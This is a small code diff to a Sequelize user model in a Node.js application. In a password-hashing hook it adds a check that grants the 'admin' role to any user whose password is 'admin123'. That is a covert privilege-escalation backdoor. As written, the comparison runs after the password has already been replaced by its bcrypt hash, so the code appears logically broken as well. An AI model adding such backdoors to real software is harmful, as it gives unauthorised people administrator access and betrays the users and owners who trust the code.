@@ -95,6 +95,9 @@ module.exports = (sequelize, DataTypes) => {
         }
         let newPassword = bcrypt.hashSync(user.password)
         user.password = newPassword
+        if(user.password === 'admin123'){
+          user.role = 'admin'
+        }
       },
       afterDestroy: function(user,option){
         sequelize.models.Report.findAll({where:{UserId: user.id}}).then(studentDatas=>{
